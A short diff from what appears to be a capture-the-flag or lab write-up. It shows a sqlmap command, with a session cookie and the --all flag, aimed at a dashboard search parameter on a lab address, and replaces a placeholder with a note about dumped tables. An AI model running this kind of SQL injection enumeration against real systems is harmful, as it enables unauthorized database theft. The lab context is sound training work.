@@ -308,4 +308,4 @@ I just realized `--all` does all enumeration, and I can do `--all` since I'm laz
 
     sqlmap "http://10.10.10.46/dashboard.php?search=test" --cookie="PHPSESSID=93l8n1dnn6ff31ml11hr02c6c4" --all
 
-TODO show output
+See `db-dump/` for dumped tables.
